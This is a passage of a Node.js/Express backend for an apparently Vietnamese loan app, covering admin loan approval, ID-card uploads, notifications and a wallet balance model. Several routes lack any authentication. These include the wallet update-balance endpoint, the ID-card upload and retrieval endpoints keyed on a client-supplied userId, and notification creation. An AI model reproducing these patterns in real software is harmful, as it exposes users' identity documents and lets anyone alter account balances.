      if (userData.personalInfo.gender)
        user.personalInfo.gender = userData.personalInfo.gender;
      if (userData.personalInfo.address)
        user.personalInfo.address = userData.personalInfo.address;
    }

    // Cập nhật thông tin ngân hàng
    if (userData.bankInfo) {
      if (!user.bankInfo) user.bankInfo = {};

      if (userData.bankInfo.bank) user.bankInfo.bank = userData.bankInfo.bank;
      if (userData.bankInfo.accountNumber)
        user.bankInfo.accountNumber = userData.bankInfo.accountNumber;
      if (userData.bankInfo.accountName)
        user.bankInfo.accountName = userData.bankInfo.accountName;
    }

    await user.save();

    // Tạo thông báo cho người dùng
    const notification = new Notification({
      userId: user._id,
      title: "Thông tin của bạn đã được cập nhật",
      message:
        "Quản trị viên đã cập nhật thông tin của bạn. Vui lòng kiểm tra lại thông tin cá nhân.",
      isRead: false,
      createdAt: new Date(),
    });

    await notification.save();

    return res.json({
      success: true,
      message: "User information updated successfully",
      user,
    });
  } catch (error) {
    console.error("Error updating user information:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

app.delete("/api/admin/users/:userId", isAdmin, async (req, res) => {
  try {
    const { userId } = req.params;

    // Delete user
    const user = await User.findByIdAndDelete(userId);

    if (!user) {
      return res
        .status(404)
        .json({ success: false, message: "User not found" });
    }

    // Also delete related documents
    await Document.deleteMany({ userId });

    // Also delete related contracts
    await Contract.deleteMany({ userId });

    res.status(200).json({
      success: true,
      message: "User and associated data deleted successfully",
    });
  } catch (error) {
    console.error("Delete user error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// Loan Application Management
app.get("/api/admin/loans", isAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 10, status, search } = req.query;

    const queryOptions = {};

    if (search) {
      // Find users matching search query
      const users = await User.find({
        $or: [
          { phone: { $regex: search, $options: "i" } },
          { fullName: { $regex: search, $options: "i" } },
        ],
      }).select("_id");

      const userIds = users.map((user) => user._id);

      queryOptions.$or = [
        { contractId: { $regex: search, $options: "i" } },
        { userId: { $in: userIds } },
      ];
    }

    // Add a status field to Contract schema to track approval status
    if (status) {
      queryOptions.status = status;
    }

    const loans = await Contract.find(queryOptions)
      .populate("userId", "phone fullName")
      .sort({ createdAt: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit));

    const totalLoans = await Contract.countDocuments(queryOptions);

    res.status(200).json({
      success: true,
      loans,
      pagination: {
        total: totalLoans,
        page: Number(page),
        limit: Number(limit),
        pages: Math.ceil(totalLoans / limit),
      },
    });
  } catch (error) {
    console.error("Get loans error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

app.get("/api/admin/loans/:loanId", isAdmin, async (req, res) => {
  try {
    const { loanId } = req.params;

    const loan = await Contract.findById(loanId).populate(
      "userId",
      "phone fullName personalInfo bankInfo"
    );

    if (!loan) {
      return res
        .status(404)
        .json({ success: false, message: "Loan not found" });
    }

    res.status(200).json({
      success: true,
      loan,
    });
  } catch (error) {
    console.error("Get loan details error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// Update loan status and details
app.put("/api/admin/loans/:loanId", isAdmin, async (req, res) => {
  try {
    const { loanId } = req.params;
    const { status, bankName, loanAmount, loanTerm, contractContent } =
      req.body;

    const updateData = {};

    if (status) updateData.status = status;
    if (bankName) updateData.bankName = bankName;
    if (loanAmount) updateData.loanAmount = loanAmount;
    if (loanTerm) updateData.loanTerm = loanTerm;
    if (contractContent) updateData.contractContent = contractContent;

    const loan = await Contract.findByIdAndUpdate(
      loanId,
      { $set: updateData },
      { new: true }
    );

    if (!loan) {
      return res
        .status(404)
        .json({ success: false, message: "Loan not found" });
    }

    res.status(200).json({
      success: true,
      message: "Loan updated successfully",
      loan,
    });
  } catch (error) {
    console.error("Update loan error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// Update signature image
app.put("/api/admin/loans/:loanId/signature", isAdmin, async (req, res) => {
  try {
    const { loanId } = req.params;
    const { signatureImage } = req.body;

    if (!signatureImage) {
      return res.status(400).json({
        success: false,
        message: "Chữ ký không được cung cấp!",
      });
    }

    // Find the loan contract
    const loan = await Contract.findById(loanId);

    if (!loan) {
      return res.status(404).json({
        success: false,
        message: "Không tìm thấy hợp đồng vay!",
      });
    }

    // Convert base64 image to file and save
    const signaturePath = `/uploads/signatures/admin_signature_${loanId}_${Date.now()}.png`;
    const signatureFullPath = path.join(__dirname, signaturePath);

    // Make sure the signatures directory exists
    const signaturesDir = path.join(__dirname, "uploads/signatures");
    if (!fs.existsSync(signaturesDir)) {
      fs.mkdirSync(signaturesDir, { recursive: true });
    }

    // Remove header from base64 string
    const base64Data = signatureImage.replace(/^data:image\/png;base64,/, "");

    // Write file to disk
    fs.writeFileSync(signatureFullPath, base64Data, "base64");

    // Update loan with signature URL
    loan.signatureImage = signaturePath;
    await loan.save();

    return res.json({
      success: true,
      message: "Chữ ký đã được cập nhật thành công!",
      signatureUrl: signaturePath,
    });
  } catch (error) {
    console.error("Error updating signature:", error);
    return res.status(500).json({
      success: false,
      message: "Đã xảy ra lỗi khi cập nhật chữ ký!",
    });
  }
});

// System Settings
app.get("/api/admin/settings", isAdmin, async (req, res) => {
  try {
    // Create a settings collection to store system settings
    const settings = {
      interestRate: "1%", // Default interest rate
      maxLoanAmount: "100000000",
      maxLoanTerm: "36",
      // Add more settings as needed
    };

    res.status(200).json({
      success: true,
      settings,
    });
  } catch (error) {
    console.error("Get settings error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

app.put("/api/admin/settings", isAdmin, async (req, res) => {
  try {
    const updateData = req.body;

    // Update settings
    // In a production app, create a Settings model and store in database

    res.status(200).json({
      success: true,
      message: "Settings updated successfully",
      settings: updateData,
    });
  } catch (error) {
    console.error("Update settings error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// Admin - Loan Approval API Endpoint
app.put("/api/admin/loans/:loanId/approve", isAdmin, async (req, res) => {
  try {
    const { loanId } = req.params;

    // Tìm hợp đồng vay
    const loan = await Contract.findById(loanId);
    if (!loan) {
      return res.status(404).json({
        success: false,
        message: "Không tìm thấy hợp đồng vay",
      });
    }

    // Cập nhật trạng thái hợp đồng
    loan.status = "approved";
    loan.approvedDate = new Date();
    loan.approvedBy = req.admin.id;
    await loan.save();

    // Xử lý số tiền vay thành số
    const loanAmount = parseFloat(loan.loanAmount.replace(/[^\d]/g, ""));

    // Tìm hoặc tạo ví cho user
    let wallet = await Wallet.findOne({ userId: loan.userId });
    if (!wallet) {
      wallet = new Wallet({ userId: loan.userId, balance: 0 });
    }

    // Cập nhật số dư ví
    wallet.balance += loanAmount;

    // Thêm giao dịch vào lịch sử
    wallet.transactions.push({
      type: "loan_approved",
      amount: loanAmount,
      description: `Khoản vay #${loan.contractId} được phê duyệt`,
      createdAt: new Date(),
    });

    await wallet.save();

    // Tạo thông báo cho user
    const notification = new Notification({
      userId: loan.userId,
      title: "Khoản vay được phê duyệt",
      message: `Khoản vay của bạn đã được phê duyệt với số tiền ${loanAmount.toLocaleString(
        "vi-VN"
      )} VNĐ`,
      type: "loan_approved",
      isRead: false,
      createdAt: new Date(),
    });

    await notification.save();

    return res.json({
      success: true,
      message: "Hợp đồng vay đã được phê duyệt thành công",
      loan,
      wallet,
      notification,
    });
  } catch (error) {
    console.error("Error approving loan:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi phê duyệt hợp đồng vay",
    });
  }
});

// Admin - Loan Rejection API Endpoint
app.put("/api/admin/loans/:loanId/reject", isAdmin, async (req, res) => {
  try {
    const { loanId } = req.params;

    // Find the loan contract
    const loan = await Contract.findById(loanId);

    if (!loan) {
      return res.status(404).json({
        success: false,
        message: "Không tìm thấy hợp đồng vay!",
      });
    }

    // Update loan status to rejected
    loan.status = "rejected";
    loan.rejectedDate = new Date();
    loan.rejectedBy = req.admin.id;
    loan.rejectionReason = req.body.reason || "Không đáp ứng điều kiện vay";

    await loan.save();

    // Find the user who created this loan
    const user = await User.findById(loan.userId);

    if (user) {
      // Create notification for user
      await Notification.create({
        userId: user._id,
        title: "Hợp đồng vay đã bị từ chối",
        message: `Hợp đồng vay của bạn với mã ${loan.contractId} đã bị từ chối. Lý do: ${loan.rejectionReason}`,
        type: "loan_rejected",
        isRead: false,
        createdAt: new Date(),
      });
    }

    return res.json({
      success: true,
      message: "Hợp đồng vay đã bị từ chối!",
      loan,
    });
  } catch (error) {
    console.error("Error rejecting loan:", error);
    return res.status(500).json({
      success: false,
      message: "Đã xảy ra lỗi khi từ chối hợp đồng vay!",
    });
  }
});

// Upload CMND/CCCD mặt trước
app.post(
  "/api/verification/id-card/front",
  upload.single("image"),
  async (req, res) => {
    try {
      const { userId } = req.query;
      if (!userId) {
        return res
          .status(400)
          .json({ success: false, message: "User ID is required" });
      }

      // Kiểm tra file có tồn tại không
      if (!req.file) {
        return res
          .status(400)
          .json({ success: false, message: "No image file uploaded" });
      }

      // Lấy đường dẫn ảnh
      const idCardFrontPath = `/uploads/documents/${req.file.filename}`;

      // Cập nhật vào database
      const user = await User.findById(userId);
      if (!user) {
        return res
          .status(404)
          .json({ success: false, message: "User not found" });
      }

      if (!user.personalInfo) {
        user.personalInfo = {};
      }

      user.personalInfo.idCardFrontImage = idCardFrontPath;
      await user.save();

      return res.json({
        success: true,
        message: "ID card front image uploaded successfully",
        imageUrl: idCardFrontPath,
      });
    } catch (error) {
      console.error("Error uploading ID card front image:", error);
      return res.status(500).json({ success: false, message: "Server error" });
    }
  }
);

// Upload CMND/CCCD mặt sau
app.post(
  "/api/verification/id-card/back",
  upload.single("image"),
  async (req, res) => {
    try {
      const { userId } = req.query;
      if (!userId) {
        return res
          .status(400)
          .json({ success: false, message: "User ID is required" });
      }

      // Kiểm tra file có tồn tại không
      if (!req.file) {
        return res
          .status(400)
          .json({ success: false, message: "No image file uploaded" });
      }

      // Lấy đường dẫn ảnh
      const idCardBackPath = `/uploads/documents/${req.file.filename}`;

      // Cập nhật vào database
      const user = await User.findById(userId);
      if (!user) {
        return res
          .status(404)
          .json({ success: false, message: "User not found" });
      }

      if (!user.personalInfo) {
        user.personalInfo = {};
      }

      user.personalInfo.idCardBackImage = idCardBackPath;
      await user.save();

      return res.json({
        success: true,
        message: "ID card back image uploaded successfully",
        imageUrl: idCardBackPath,
      });
    } catch (error) {
      console.error("Error uploading ID card back image:", error);
      return res.status(500).json({ success: false, message: "Server error" });
    }
  }
);

// Lấy thông tin CMND/CCCD của người dùng
app.get("/api/users/:userId/id-card", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res
        .status(404)
        .json({ success: false, message: "User not found" });
    }

    if (!user.personalInfo) {
      return res
        .status(404)
        .json({ success: false, message: "Personal info not found" });
    }

    const idCardInfo = {
      frontImage: user.personalInfo.idCardFrontImage || null,
      backImage: user.personalInfo.idCardBackImage || null,
      idNumber: user.personalInfo.idNumber || null,
      fullName: user.fullName || null,
    };

    return res.json({ success: true, idCardInfo });
  } catch (error) {
    console.error("Error fetching ID card info:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// Thêm API endpoint cho thông báo
app.get("/api/notifications", async (req, res) => {
  try {
    const userId = req.query.userId;
    if (!userId) {
      return res
        .status(400)
        .json({ success: false, message: "User ID is required" });
    }

    const notifications = await Notification.find({ userId }).sort({
      createdAt: -1,
    });

    return res.json({
      success: true,
      notifications,
    });
  } catch (error) {
    console.error("Error fetching notifications:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// Đánh dấu thông báo đã đọc
app.put("/api/notifications/:notificationId/read", async (req, res) => {
  try {
    const { notificationId } = req.params;
    const notification = await Notification.findByIdAndUpdate(
      notificationId,
      { isRead: true },
      { new: true }
    );

    if (!notification) {
      return res
        .status(404)
        .json({ success: false, message: "Notification not found" });
    }

    return res.json({
      success: true,
      notification,
    });
  } catch (error) {
    console.error("Error marking notification as read:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// Thêm Schema cho Wallet
const walletSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "User",
    required: true,
  },
  balance: {
    type: Number,
    default: 0,
  },
  transactions: [
    {
      type: {
        type: String,
        enum: ["deposit", "withdraw", "loan_approved", "loan_rejected"],
        required: true,
      },
      amount: {
        type: Number,
        required: true,
      },
      description: String,
      createdAt: {
        type: Date,
        default: Date.now,
      },
    },
  ],
});

const Wallet = mongoose.model("Wallet", walletSchema);

// API cập nhật số dư ví
app.post("/api/wallet/update-balance", async (req, res) => {
  try {
    const { userId, amount, type, description } = req.body;

    // Tìm hoặc tạo ví cho user
    let wallet = await Wallet.findOne({ userId });
    if (!wallet) {
      wallet = new Wallet({ userId, balance: 0 });
    }

    // Cập nhật số dư
    if (type === "LOAN_APPROVED") {
      wallet.balance += parseFloat(amount);
    } else if (type === "LOAN_REJECTED") {
      wallet.balance = 0;
    }

    // Thêm giao dịch vào lịch sử
    wallet.transactions.push({
      type: type.toLowerCase(),
      amount: parseFloat(amount),
      description,
    });

    await wallet.save();

    return res.json({
      success: true,
      message: "Cập nhật số dư thành công",
      balance: wallet.balance,
    });
  } catch (error) {
    console.error("Error updating wallet balance:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi cập nhật số dư",
    });
  }
});

// API lấy số dư ví
app.get("/api/wallet/balance", async (req, res) => {
  try {
    const { userId } = req.query;
    if (!userId) {
      return res.status(400).json({
        success: false,
        message: "User ID is required",
      });
    }

    const wallet = await Wallet.findOne({ userId });
    return res.json({
      success: true,
      balance: wallet ? wallet.balance : 0,
    });
  } catch (error) {
    console.error("Error fetching wallet balance:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi lấy số dư ví",
    });
  }
});

// API lấy lịch sử giao dịch
app.get("/api/wallet/transactions", async (req, res) => {
  try {
    const { userId } = req.query;
    if (!userId) {
      return res.status(400).json({
        success: false,
        message: "User ID is required",
      });
    }

    const wallet = await Wallet.findOne({ userId });
    return res.json({
      success: true,
      transactions: wallet ? wallet.transactions : [],
    });
  } catch (error) {
    console.error("Error fetching transactions:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi lấy lịch sử giao dịch",
    });
  }
});

// API endpoint để xóa hợp đồng vay
app.delete("/api/admin/loans/:loanId", isAdmin, async (req, res) => {
  try {
    const { loanId } = req.params;

    // Tìm hợp đồng vay
    const loan = await Contract.findById(loanId);
    if (!loan) {
      return res.status(404).json({
        success: false,
        message: "Không tìm thấy hợp đồng vay",
      });
    }

    // Kiểm tra trạng thái hợp đồng
    if (loan.status === "approved") {
      return res.status(400).json({
        success: false,
        message: "Không thể xóa hợp đồng đã được phê duyệt",
      });
    }

    // Xóa hợp đồng
    await Contract.findByIdAndDelete(loanId);

    // Gửi thông báo cho user
    await Notification.create({
      userId: loan.userId,
      title: "Hợp đồng vay đã bị xóa",
      message: `Hợp đồng vay #${loan.contractId} đã bị xóa khỏi hệ thống.`,
      type: "loan_deleted",
      isRead: false,
    });

    return res.json({
      success: true,
      message: "Đã xóa hợp đồng vay thành công",
    });
  } catch (error) {
    console.error("Error deleting loan:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi xóa hợp đồng vay",
    });
  }
});

// Thêm endpoint tạo thông báo
app.post("/api/notifications", async (req, res) => {
  try {
    const { userId, title, message, type } = req.body;

    if (!userId || !title || !message) {
      return res.status(400).json({
        success: false,
        message: "Thiếu thông tin cần thiết",
      });
    }

    const notification = new Notification({
      userId,
      title,
      message,
      type,
      isRead: false,
      createdAt: new Date(),
    });

    await notification.save();

    return res.json({
      success: true,
      message: "Đã tạo thông báo thành công",
      notification,
    });
  } catch (error) {
    console.error("Error creating notification:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi tạo thông báo",
    });
  }
});

// Cuối cùng là route catch-all
app.get("*", (req, res) => {
  // Bỏ khai báo userAgent vì không cần thiết nữa
  const bypassCheck = req.query.bypass_mobile_check === "true";

  // Nếu có tham số bypass_mobile_check=true, luôn cho phép truy cập
  if (bypassCheck) {
    console.log("Bypass check enabled, serving application");
  }

  // Luôn cho phép truy cập và để client xử lý việc kiểm tra kích thước màn hình
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  // Start the anti-sleep mechanism
  keepServerAwake();
});
